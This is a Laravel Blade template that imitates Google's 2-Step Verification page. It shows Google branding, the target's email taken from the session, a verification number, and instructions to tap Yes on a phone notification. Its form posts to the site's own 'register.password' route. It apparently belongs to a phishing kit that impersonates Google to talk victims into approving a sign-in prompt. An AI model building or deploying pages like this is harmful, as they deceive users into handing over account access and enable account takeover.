<x-guest-layout>
    <!-- Session Status -->
    <x-auth-session-status class="mb-4" :status="session('status')" />
    @section('title')
        {{__('2 step Verification for Google account')}}
    @endsection
    <div class="containerCode">
        <div class="container">
            <div class="imgBox">
                <img  src="{{asset('google-sign.png')}}" alt="Google" width="50px" height="30px"/>
            </div>
            <div class="box1">
                <div>
                    <div>
                        <br>
                        <h1 style="font-size: 36px"><strong>2-Step Verification</strong></h1>
                        <br>
                        <p>To help keep your account safe, Google wants to make sure it`s really you trying to sign in</p>
                        <br>
                        <p class="showmail">
{{--                            <img src="{{asset('account.png')}}" alt="account"/>--}}
                            <ion-icon name="person-circle-outline"></ion-icon>
                            {{session('email')}}
{{--                            <img src="{{asset('selectmenu.png')}}" alt="select"/>--}}
                            <ion-icon name="caret-down-outline"></ion-icon>
                        </p>
                        <br>
                        <br>
                        <p style="color: #6b7280;cursor: pointer">Resend it</p>
                        <br>
                        <br>
                    </div>
                </div>
                <div>
                    <form method="POST" action="{{ route('register.password') }}">
                        @csrf
                        <div>
                            <h1 style="font-size: 36px;text-align: center;width: 100%;"><strong>
                                    @if(isset($user->code))
                                        {{$user->code}}
                                    @endif
                                </strong></h1>
                            <h2 style="font-size: 29px">Check your Phone</h2>
                            <br>
                            <p>Google sent a notification to your Phone. Tap Yes on the notification, then tap {{isset($user->code->code)}} on your phone to verify it`s you.
                            <br>
                            <br>
                            Or open the Gmail app on your Phone to verify it`s you from there.
                                <br>
                                <br>
                                <label for="checkbox" style="display: flex;align-items: center">
                                <input
                                    style="width:20px;height:20px;"
                                    name="checkbox"
                                    id="checkbox"
                                    checked="true"
                                    type="checkbox"/>&nbsp;&nbsp;Don`t ask again on this device
                                </label>
                                <br>
                                <br>
                                <br>
                                <br>
                                <br>
                            </p>
                            <p style="color: #3b82f6;width: 100%;display: flex;justify-content: flex-end;cursor: pointer">Try another way</p>
                        </div>
                    </form>
                </div>
            </div>
        </div>
    </div>
</x-guest-layout>
